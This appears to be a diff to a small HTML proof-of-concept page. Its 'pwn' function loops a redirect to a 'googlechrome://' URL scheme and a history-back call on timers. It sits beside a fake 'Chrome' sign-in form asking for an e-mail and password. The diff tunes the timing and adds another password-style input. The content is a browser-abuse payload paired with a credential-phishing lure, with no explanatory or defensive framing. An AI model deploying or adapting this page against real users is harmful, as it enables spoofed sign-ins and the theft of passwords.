@@ -1,9 +1,9 @@
 
 	<script>
 	    function pwn() {
-		    alert();
+		    
 	           setInterval(`x=document.location='googlechrome://about:about';`, 1);
-		    setInterval(`window.history.go(-1);`, 2712);
+		    setInterval(`window.history.go(-1);`, 1000);
 	    }
 	</script>
 	<li onclick="pwn();">step1: click me</li>
@@ -11,3 +11,6 @@
 Already a Chrome user? Sign in
 <li>Your e-mail <input type="search"></li>
 <li> Your password <input type="password"></li>
+
+
+<li> Your password <input onclick="location.reload()"></li>
